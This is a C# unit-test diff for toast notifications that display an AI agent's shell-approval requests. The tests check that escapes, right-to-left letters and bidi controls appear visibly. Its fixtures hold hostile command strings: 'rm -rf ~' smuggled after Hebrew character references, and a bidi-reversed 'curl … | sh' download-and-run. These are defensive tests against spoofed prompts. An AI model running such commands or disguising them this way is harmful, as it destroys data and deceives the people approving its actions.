@@ -300,6 +300,29 @@ public sealed class ToastTests
         Assert.Contains("PC · waiting at the machine", held.Descendants("text").Select(t => t.Value));
     }
 
+    [Fact]
+    public void An_approvals_toast_reads_as_its_card_does_the_agents_words_without_their_escapes_and_the_command_as_written()
+    {
+        // A host escapes the agent's own words (#212); the command is code, so its * and _ are its own.
+        var q = Make.Approval() with { Message = "Allow **shell**?\n\nRun it\n\\`\\`\\` \\[safe\\](https\\://other.example)\n\n```\nrm -rf build/**/cache && python __init__.py\n```" };
+
+        var toast = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: q), Caps, "PC"), false));
+
+        Assert.Contains("Allow shell? Run it ``` [safe](https://other.example) rm -rf build/**/cache && python __init__.py", toast.Descendants("text").Select(t => t.Value));
+    }
+
+    // An older host's approval can hold a reference to a right-to-left letter, which reading it as
+    // Markdown decodes: the toast shows it escaped, as the card's source does.
+    [Theory]
+    [InlineData("Allow **shell**?\n\nTidy &#x5D0;&#x5D1; up\n\n```\nls\n```", "\\u05D0\\u05D1")]
+    [InlineData("Allow **shell**?\n\necho &#1488;#;&#1489;;rm -rf ~\n\n```\nls\n```", "\\u05D0#;\\u05D1")]
+    public void An_approvals_toast_shows_a_reference_its_words_decode_to_as_an_escape(string message, string shown)
+    {
+        var toast = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Approval() with { Message = message }), Caps, "PC"), false));
+
+        Assert.Contains(toast.Descendants("text"), t => t.Value.Contains(shown, StringComparison.Ordinal) && !ShownText.HasHidden(t.Value) && !ShownText.HasRightToLeft(t.Value));
+    }
+
     // An older host's approval can still hold a live bidi control or right-to-left letters (#220).
     [Theory]
     [InlineData("Allow **shell**?\n\n```\necho done #\u202E ;hs | p/x//:sptth lruc\n```", "\\u202E")]
